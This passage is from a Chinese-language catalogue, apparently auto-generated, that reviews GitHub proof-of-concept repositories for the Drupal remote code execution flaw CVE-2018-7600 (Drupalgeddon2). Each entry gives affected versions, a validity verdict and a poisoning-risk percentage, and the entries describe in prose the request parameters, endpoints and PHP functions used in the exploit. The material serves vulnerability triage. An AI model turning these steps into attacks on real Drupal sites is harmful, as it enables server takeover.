2.  **命令注入风险：**  虽然脚本主要执行的是 `whoami` 命令，但是攻击者可以修改脚本，执行其他更具危害性的命令，比如删除文件、修改配置等。EXP.py允许自定义执行命令，存在风险。在使用时需要注意目标和命令。

总体而言，该仓库中作者隐藏的投毒代码的风险较低，大约为5%。

**利用方式：**

1.  **目标探测：**  使用`CVE-2018-7600-Drupal7.py` 脚本,通过提供包含目标URL的 `target.txt` 文件，批量扫描存在漏洞的Drupal站点。
2.  **漏洞利用：**  使用`CVE-2018-7600-Drupal7-EXP.py` 脚本，指定目标URL和要执行的命令，通过构造恶意请求，在目标Drupal站点上执行任意代码。 EXP.py允许自定义执行函数passthru，同样存在风险。
3.  **结果验证：**  检查命令执行的结果，确认漏洞是否成功利用。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，攻击者可以利用该漏洞在Drupal站点上执行任意代码。虽然提供的POC代码本身不存在明显的恶意行为，但是仍然存在一定的投毒风险。在使用这些代码时，需要谨慎评估风险，并采取相应的安全措施。

**项目地址:** [rabbitmask/CVE-2018-7600-Drupal7](https://github.com/rabbitmask/CVE-2018-7600-Drupal7)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #22

**来源**: [CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md](../2018/CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点必须使用受影响的版本，且未打补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal的Forms API中存在属性注入缺陷，允许未经身份验证的攻击者通过构造特制的请求来执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。漏洞库信息明确指出存在远程代码执行，搜索结果中也确认了该漏洞的严重性和广泛利用。提供的Python脚本`drupalgeddon2.py`允许测试目标是否易受攻击，并执行任意命令。

**投毒风险：**
虽然提供的代码可以直接利用漏洞执行命令，但仍然存在一定的投毒风险，例如：
*   该仓库只包含简单的利用脚本和一个README,代码量少,检查难度低. 
*   代码中利用`requests`库发送HTTP请求，如果被篡改，可能会向恶意服务器发送敏感信息或执行其他恶意操作.因为代码量少,只有10%的风险。

**利用方式：**
该漏洞的利用方式如下：
1.  攻击者构造一个包含恶意参数的HTTP POST请求，发送到目标Drupal站点的`user/password`路径。
2.  恶意参数利用了Drupal Forms API中的`#post_render`属性，允许攻击者指定一个PHP函数（例如`passthru`）来执行命令。
3.  `name[#markup]`参数包含要执行的操作系统命令。
4.  目标Drupal站点处理请求时，会执行攻击者指定的命令。
5.  攻击者可以通过`?q=/file/ajax/name/%23value/` 获取命令执行的结果。

总之，CVE-2018-7600是一个严重的安全漏洞，允许远程攻击者执行任意代码。提供的POC代码是有效的，但使用者应谨慎使用，并注意潜在的投毒风险。

**项目地址:** [rafaelcaria/drupalgeddon2-CVE-2018-7600](https://github.com/rafaelcaria/drupalgeddon2-CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #23

**来源**: [CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站运行在受影响的版本，且允许未授权访问的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。由于Drupal的Form API（FAPI）在处理AJAX请求时，未充分清理数组值，导致未经身份验证的攻击者可以通过构造恶意请求来执行任意代码。利用方式通常涉及发送包含恶意payload的POST请求到特定Drupal路径（例如/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax）。

**有效性：**
根据漏洞库信息、搜索引擎结果（如NVD、Rapid7、Trend Micro等）以及提供的POC代码，此漏洞是真实存在的，并且存在公开可用的利用代码。POC代码提供单目标、多目标、自定义命令执行等功能，并具有彩色CLI输出和日志记录，增加了利用的便利性，因此该POC代码有效。

**投毒风险：**
分析提供的`drupalgeddon2.py`代码片段，未发现明显的恶意投毒代码。代码主要功能是发送HTTP请求，执行命令，并解析结果，都是漏洞利用的正常行为。虽然存在远程代码执行的风险，但这是漏洞本身的性质，而不是POC引入的额外风险。README中存在免责声明，强调该工具仅用于授权的渗透测试。投毒风险评估为10%，主要考虑到以下几点：
* 代码的复杂性可能隐藏不易察觉的后门。
* 作者有可能在后续版本中添加恶意代码。

**利用方式：**
1.  确定目标Drupal网站是否运行在受影响的版本（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  使用提供的POC脚本，指定目标URL和要执行的命令。
3.  运行脚本，脚本会发送特制的HTTP POST请求到Drupal网站。
4.  如果漏洞存在，Drupal网站将执行指定的命令，并将结果返回给攻击者。
5.  攻击者可以利用此漏洞进一步控制服务器，例如安装恶意软件、窃取数据等。

**项目地址:** [rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution](https://github.com/rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #24

**来源**: [CVE-2018-7600-raytran54_CVE-2018-7600.md](../2018/CVE-2018-7600-raytran54_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权远程代码执行

**影响版本:** Drupal 7.x < 7.58, Drupal 8.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标Drupal站点启用user_register_form或者其他存在可利用的Form API Ajax Request的模块

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意的请求，利用Drupal的Form API中的漏洞，在目标服务器上执行任意代码。

**有效性分析：**

根据提供的漏洞库信息、搜索结果以及漏洞利用代码，该漏洞的POC代码是有效的。搜索结果中包含了多个关于该漏洞的分析、利用以及修复建议，证明该漏洞在野外被广泛利用。

提供的Python POC利用了user_register_form，通过修改mail字段，构造恶意的payload，将命令注入到#post_render中，触发远程代码执行。代码首先构造包含恶意命令的POST请求，发送到/user/register，然后尝试读取/res.txt，如果成功读取，则表明目标存在漏洞，并输出命令执行结果。

**投毒风险分析：**

提供的POC代码本身较为简洁，主要功能是发送恶意请求并读取结果。README.md文件主要包含漏洞分析、原理说明和缓解措施。检查了Python脚本，发现它执行命令并将输出写入一个名为res.txt的文件，这本身不是投毒，而是漏洞利用的一部分。但理论上，如果攻击者替换了POC中执行的命令，可能会导致服务器执行恶意操作，例如下载恶意软件或修改系统配置。但基于目前提供的文件内容，投毒风险极低。

综合考虑，该仓库存在投毒代码的风险极低，约为1%。

**利用方式分析：**

1.  **漏洞触发点：** Drupal的Form API在处理Ajax请求时，没有充分验证用户输入，导致可以注入恶意代码。
2.  **利用途径：** 攻击者通过构造特殊的POST请求，修改`form_id`、`_drupal_ajax`，`mail[#post_render][]`等参数。
3.  **代码执行：** Drupal在处理请求时，会将`mail[#post_render][]`中的内容作为PHP函数执行，从而导致远程代码执行。
4.  **验证：** POC通过执行命令，并将结果写入res.txt文件，然后尝试读取该文件来验证漏洞是否存在。

**防范措施:**

*   及时升级Drupal版本到安全版本（7.58, 8.3.9, 8.4.6, 或 8.5.1之后）。
*   应用Drupal官方提供的补丁。
*   使用Web应用防火墙（WAF）过滤恶意请求。

**项目地址:** [raytran54/CVE-2018-7600](https://github.com/raytran54/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #25

**来源**: [CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md](../2018/CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且使用默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求，将恶意代码注入到系统，从而实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索引擎结果以及大量的公开利用代码来看，该漏洞的利用具有很高的有效性。 搜索结果中，许多文章都讨论了该漏洞的利用方法，Metasploit中也有相应的利用模块，Exploit-DB上也有相关的exploit。

**投毒风险：**

提供的漏洞利用代码仅包含GNU GPL许可协议，没有发现直接的恶意代码。但是，任何从不可信来源获取的代码都存在潜在的投毒风险。即使代码本身看起来无害，也可能存在细微的缺陷或依赖关系，这些缺陷或依赖关系可能会被恶意利用。因此，对下载的POC代码进行代码审计是必要的。

考虑到仅仅是LICENSE文件，投毒概率极低，仅为5%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **发送恶意请求：** 攻击者构造包含恶意代码的特殊请求，该请求通常通过URL参数或POST数据发送。
2.  **利用漏洞：** Drupal在处理该请求时，由于输入验证不足，会将恶意代码传递给PHP的`exec()`或类似函数执行。
3.  **执行任意代码：** 恶意代码在服务器上执行，攻击者可以控制服务器，例如安装后门、窃取数据等。

攻击者可以利用该漏洞执行任意系统命令，从而完全控制受影响的Drupal服务器。该漏洞影响多个Drupal版本，因此影响范围非常广泛。

**项目地址:** [ruthvikvegunta/Drupalgeddon2](https://github.com/ruthvikvegunta/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #26

**来源**: [CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md](../2018/CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于多个子系统存在输入验证不足的问题，允许远程攻击者执行任意代码。

**有效性：**
提供的POC代码（Drupal-RCE-Mass-Exploiter.py）针对Drupal 7和Drupal 8的不同利用方式。对于Drupal 7，它利用`user/password`表单的`#post_render`属性和`file/ajax`端点。对于Drupal 8，它利用`user/register`表单的`timezone`字段。

根据漏洞库信息和搜索引擎结果，此漏洞利用代码是有效的，多个Exploit-DB条目 (44482, 44448, 44449)和安全博客(Rapid7, Palo Alto Networks, Tenable等)确认了其存在和严重性，并且在实际环境中被广泛利用。

**投毒风险：**
此脚本本身主要功能是批量检测和利用漏洞，但仍存在潜在的投毒风险：

*   **命令执行：** 脚本允许通过`COMMAND`变量指定要执行的命令，如果攻击者修改了脚本并分享给他人，可能会将`COMMAND`设置为恶意代码。
*   **后门植入：** 虽然未直接观察到后门代码，但如果恶意用户分发修改后的版本，它们可能会添加后门植入代码，例如添加管理员账户或修改核心文件。
*   **代理风险：** 脚本支持使用代理，恶意代理服务器可能会窃取受害者服务器的敏感信息。

总体来说，脚本的投毒风险较低，约为10%，因为其主要功能是漏洞利用，但使用前仍需仔细审查代码。

**利用方式：**

1.  **Drupal 7:**
    *   利用`user/password`表单中的`name[#post_render]`属性执行命令。攻击者构造一个包含恶意PHP代码的请求，该代码将在服务器上执行。
    *   使用`file/ajax`端点来触发命令执行。
2.  **Drupal 8:**
    *   利用`user/register`表单中的`timezone`字段和`#post_render`属性执行命令。
    *   构造包含恶意PHP代码的AJAX请求，并在服务器端执行。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，影响多个Drupal版本。提供的POC代码是有效的，但使用前需要仔细审查，以避免潜在的投毒风险。攻击者可以利用此漏洞获取服务器的完全控制权。

**项目地址:** [shellord/CVE-2018-7600-Drupal-RCE](https://github.com/shellord/CVE-2018-7600-Drupal-RCE)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #27

**来源**: [CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md](../2018/CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md)

## CVE-2018-7600 - Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标系统运行存在漏洞的Drupal版本，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，允许攻击者在服务器上执行任意代码。

**有效性:**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性很高。漏洞库信息明确指出该漏洞允许远程代码执行，搜索结果表明存在大量针对该漏洞的利用尝试，并且已经有公开的Exploit-DB条目。提供的Python代码 `mass.py` 实现了对Drupal 7 和 Drupal 8的批量漏洞利用，进一步证明了漏洞的可利用性。

**投毒风险:**
分析提供的`mass.py`代码，发现该代码主要功能是批量检测和利用Drupal的CVE-2018-7600和CVE-2018-7602漏洞。代码结构清晰，包含漏洞检测和利用的核心逻辑，没有明显的恶意或隐藏功能。但是,批量漏洞利用脚本本身如果被恶意使用，例如，大规模扫描和攻击未经授权的系统，也存在一定的潜在风险。 `README.md` 文件描述了脚本的用法，包括指定目标列表、输出文件、worker数量和代理等，以及要利用的漏洞编号。
代码中存在使用eval或者其他类似的高危函数的情况，攻击者可能会篡改`COMMAND`变量来执行恶意操作。这种潜在的风险主要来自于用户的不当使用或者受到攻击者恶意篡改的情况，而不是代码作者有意植入后门。

**利用方式:**
1.  **Drupal 7:**
    *   利用 `user/password` 路径，通过构造特定的GET和POST参数，触发`passthru`函数执行命令。
    *   首先发送包含恶意payload的POST请求到 `user/password`，触发 Drupal 的渲染过程。
    *   然后从返回的 HTML 中提取 `form_build_id`。
    *   最后再次发送包含`form_build_id`的POST请求到 `file/ajax/name/#value/{form_build_id}`，从而执行恶意代码。
2.  **Drupal 8:**
    *   利用 `user/register` 路径，通过构造特定的GET和POST参数，触发`exec`函数执行命令。
    *   构造包含恶意payload的POST请求到 `/user/register`。
漏洞利用依赖于未打补丁的Drupal版本中存在的输入验证漏洞，攻击者可以利用这些漏洞执行任意PHP代码，从而完全控制受影响的系统。

**项目地址:** [shellord/Drupalgeddon-Mass-Exploiter](https://github.com/shellord/Drupalgeddon-Mass-Exploiter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #28

**来源**: [CVE-2018-7600-soch4n_CVE-2018-7600.md](../2018/CVE-2018-7600-soch4n_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在服务器上执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且使用了默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个影响Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时存在缺陷，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。PoC代码利用了`user/register`接口的Ajax功能，通过`element_parents`参数注入恶意代码。攻击者通过操纵`mail[\"a\"][#lazy_builder][0]`和`mail[\"a\"][#lazy_builder][1][]`参数，将`system`函数和`ls -la`命令注入到Drupal的渲染过程中，从而执行系统命令。提供的代码没有明显的投毒迹象，它是一个直接的漏洞利用程序，旨在展示漏洞的存在并执行任意命令。 多个来源证实该漏洞影响了大量Drupal站点，并导致大规模攻击。

**项目地址:** [soch4n/CVE-2018-7600](https://github.com/soch4n/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #29

**来源**: [CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md](../2018/CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码，完全控制受影响的Drupal站点。

**影响版本:** Drupal 7.x (< 7.58), 8.x (< 8.3.9), 8.4.x (< 8.4.6), and 8.5.x (< 8.5.1)

**利用条件:** 目标Drupal站点必须是受影响的版本，且没有应用相应的安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的攻击者执行任意代码。漏洞利用代码展示了使用Metasploit的drupalgeddon2模块进行攻击的流程。 

**有效性：**
提供的POC代码基于Metasploit的`drupalgeddon2`模块，该模块是公开可用的，并且被广泛用于验证和利用此漏洞。因此，POC代码的**有效性很高**，如果目标满足漏洞利用条件，则能够成功执行。

**投毒风险：**
查看提供的漏洞利用代码，该代码主要是安装和配置Drupal 7.57以及使用Metasploit模块进行渗透测试的步骤。它还包含启用 ModSecurity 作为 WAF 的操作，并测试其防御能力，然后尝试使用 Metasploit 进行攻击。最后，展示了即使有WAF存在，攻击也失败了，没有打开 Meterpreter 会话。

虽然代码的本意是演示漏洞利用与防御，但依然存在极小的投毒风险：

*   环境配置脚本中，如果作者在安装包下载链接上做了手脚，替换成了恶意版本，存在投毒的可能性。但这部分可以通过校验安装包的HASH值来规避。
*   在ModSecurity规则配置中，如果包含了恶意的排除规则，则可能降低WAF的防御能力。然而，提供的配置看起来相对标准。考虑到该项目主要关注漏洞利用演示，而并非恶意软件分发，**投毒风险较低，估计在5%左右。**

**利用方式：**
1.  攻击者识别出运行着未修补的Drupal版本的站点。
2.  攻击者构造恶意请求，通常涉及`q`参数（Drupal的路径处理机制）。
3.  恶意请求利用了Drupal的某些组件对用户输入验证不足的缺陷。
4.  恶意请求导致在服务器上执行任意PHP代码，从而实现远程代码执行。
5.  可以使用Metasploit的`drupalgeddon2`模块自动化漏洞利用过程，或者手动构造payload。

**总结：**
CVE-2018-7600是一个严重的远程代码执行漏洞，利用方式相对简单，且有公开的Metasploit模块可用。尽管代码本身演示了漏洞利用和防御，但仍需警惕潜在的投毒风险。强烈建议受影响的Drupal站点尽快升级到安全版本。

**项目地址:** [tea-celikik/Drupal-Exploit-Lab](https://github.com/tea-celikik/Drupal-Exploit-Lab)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #30

**来源**: [CVE-2018-7600-thehappydinoa_CVE-2018-7600.md](../2018/CVE-2018-7600-thehappydinoa_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时存在缺陷，允许未经身份验证的攻击者通过构造特殊的请求来执行任意代码。

**有效性分析：**

*   漏洞库信息和搜索引擎结果均表明该漏洞是一个严重的安全问题，影响多个Drupal版本，并允许远程代码执行。
*   提供的POC代码尝试通过`drupal_ajax`接口注册用户，并利用`exec` markup执行bash命令。POC会执行`id`命令，并将结果写入一个随机名称的文件中，然后尝试通过HTTP访问该文件以验证漏洞利用是否成功。成功后，会尝试删除该文件。
*   多个Exploit-DB链接（如44448, 44449, 44482）表明存在公开可用的漏洞利用代码。

综合来看，提供的POC代码是有效的，可以用来验证目标Drupal站点是否存在CVE-2018-7600漏洞。

**投毒风险分析：**

*   POC代码本身主要功能是执行命令并将结果写入文件，之后验证文件是否可访问，以验证漏洞存在性。这种模式本身存在潜在的投毒风险，攻击者可以将恶意代码注入到被写入的文件中，或者修改POC使其执行更具破坏性的操作。
*   代码中`random_file_name`变量虽然使用了随机文件名，但如果被成功利用，攻击者可以精确控制写入内容和删除操作，因此存在恶意利用的可能性。
*   `download_command` 和 `rm_command` 如果被篡改，可能导致下载恶意文件或删除重要文件，因此也有潜在风险。
*   `tor_proxy`选项的存在意味着该POC可能被用于隐藏攻击者的真实IP地址，这增加了追踪和溯源的难度。
*   综合代码，投毒风险评估为10%。主要是因为POC的主要目的是验证漏洞，而大规模恶意利用需要在代码层面进行显著修改。

**利用方式分析：**

1.  **构造恶意请求：** 攻击者发送包含恶意代码的特殊构造的HTTP请求到Drupal站点。
2.  **利用`drupal_ajax`接口：** POC利用Drupal的`drupal_ajax`接口来触发漏洞。
3.  **远程代码执行：** 恶意代码通过Drupal的输入处理缺陷被执行，导致远程代码执行。
4.  **验证与清理（POC）：** POC验证代码执行成功后，会尝试清理现场（删除创建的文件）。实际攻击中，攻击者可能会执行更具破坏性的操作，例如安装后门、窃取数据或篡改网站内容。

**项目地址:** [thehappydinoa/CVE-2018-7600](https://github.com/thehappydinoa/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #31

**来源**: [CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md](../2018/CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制受影响的 Drupal 站点

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞源于 Drupal 在处理用户提供的输入时，没有进行充分的验证，攻击者可以通过精心构造的恶意请求，在服务器上执行任意代码。 

**有效性分析：**
根据漏洞库信息和搜索结果，该漏洞是一个经过验证的远程代码执行漏洞，并且存在公开可用的利用代码。大量的安全厂商和研究人员对此漏洞进行了分析和验证，证明其有效性。 

**投毒风险分析：**
提供的Python代码是一个网络数据包捕获脚本，主要用于分析网络流量，特别是HTTP流量，并检测其中是否存在CVE-2018-7600漏洞的利用尝试。 

*   **功能：** 该脚本使用 `pyshark` 库捕获网络接口上的数据包，并分析HTTP请求的URI和POST数据。它查找包含特定关键字（如`exec`, `passthru`, `system`等）的请求，这些关键字通常与远程代码执行攻击相关。  该脚本主要用于检测已知的攻击模式，而不是发起攻击。

*   **潜在投毒风险：** 虽然该脚本本身主要是用于流量分析，但仍然存在一些潜在的风险：
    *   **性能影响：** 在高流量环境下，该脚本可能会消耗大量的CPU和内存资源，导致系统性能下降。 这种消耗如果被恶意利用，可以作为一种拒绝服务攻击。
    *   **数据泄露：** 该脚本会捕获网络数据包，其中可能包含敏感信息，例如用户名、密码、API密钥等。 如果脚本的输出被不当存储或泄露，可能会导致数据泄露。
    *   **依赖风险：** `pyshark` 依赖 `tshark`，如果 `tshark` 本身存在安全漏洞，可能会影响该脚本的安全性。
    *  **后门代码：**代码中没有明显的恶意后门代码，但捕获流量到`csv`文件中可能导致信息泄露，如果该文件可以被外部访问，或者被攻击者替换，则存在风险。

**利用方式：**
根据搜索结果和漏洞描述，攻击者可以通过以下方式利用该漏洞：

1.  发送包含恶意代码的特制HTTP请求，恶意代码通常会嵌入到URL参数或POST数据中。
2.  Drupal 的某些子系统（例如节点创建、用户注册等）在处理这些请求时，由于输入验证不足，会将恶意代码传递给PHP的 `eval()` 函数或其他类似函数执行，从而导致远程代码执行。
3.  攻击者可以利用执行的代码在服务器上安装后门、窃取数据或执行其他恶意操作。

综上，该漏洞利用的有效性很高，但提供的POC代码本身更多是流量分析工具，直接投毒风险较低(5%), 但需要注意潜在的性能影响、数据泄露和依赖风险。攻击者主要通过构造恶意 HTTP 请求来触发漏洞。

**项目地址:** [vphnguyen/ANM_CVE-2018-7600](https://github.com/vphnguyen/ANM_CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #32

**来源**: [CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md](../2018/CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal 7.x (before 7.58), 8.x (before 8.3.9), 8.4.x (before 8.4.6), and 8.5.x (before 8.5.1)

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见模块配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞信息和搜索结果，此漏洞影响多个子系统，利用方式是通过构造特殊的请求，特别是利用`user/password` endpoint，结合`#post_render`属性，触发PHP的`passthru()`函数来执行任意命令。

**有效性：**

提供的PoC代码通过两个步骤利用该漏洞：

1.  发送一个包含恶意参数的POST请求到`user/password`，利用`name[#post_render][]`，`name[#markup]`和`name[#type]`参数注入命令。
2.  从响应中提取`form_build_id`，然后发送另一个包含该`form_build_id`的请求到`file/ajax/name/#value/{form_build_id}`，以触发命令执行。

根据提供的漏洞库信息、搜索结果以及利用代码，可以判断此POC代码是**有效**的，可以利用未修复的Drupal站点执行远程代码。

**投毒风险：**

评估PoC代码是否存在投毒风险：

*   代码相对简短，易于审查。
*   代码的主要功能是利用已知的Drupal漏洞执行命令，没有发现明显的恶意行为。
*   虽然代码中没有直接发现投毒代码，但是任何代码都存在被恶意修改的风险。例如，攻击者可能会修改命令执行部分，使其在执行用户指定的命令之前或之后执行其他恶意操作。

尽管直接投毒证据不多，但考虑到软件供应链的安全风险，以及任何代码都可能被篡改的可能性，综合评估投毒风险为**5%**。这个评估考虑了代码本身的简洁性以及潜在的供应链攻击风险。

**利用方式：**

1.  攻击者首先构造一个包含恶意参数的POST请求，发送到目标Drupal站点的`user/password`路径。
2.  该请求利用了Drupal的表单渲染机制中的漏洞，允许攻击者注入并执行PHP代码。
3.  服务器响应包含一个`form_build_id`，攻击者需要提取该ID。
4.  攻击者使用提取的`form_build_id`构造第二个POST请求，发送到`file/ajax/name/#value/{form_build_id}`路径。
5.  这个请求触发Drupal执行之前注入的PHP代码，从而实现远程代码执行。

通过这种方式，攻击者可以在未经身份验证的情况下，在目标Drupal服务器上执行任意命令，从而完全控制受影响的系统。

**项目地址:** [xxxTectationxxx/CVE-2018-7600](https://github.com/xxxTectationxxx/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #33

**来源**: [CVE-2018-7600-ynsmroztas_drupalhunter.md](../2018/CVE-2018-7600-ynsmroztas_drupalhunter.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个子系统，常见模块配置也可能受到影响。大量Drupal网站受到影响。 

**有效性：**

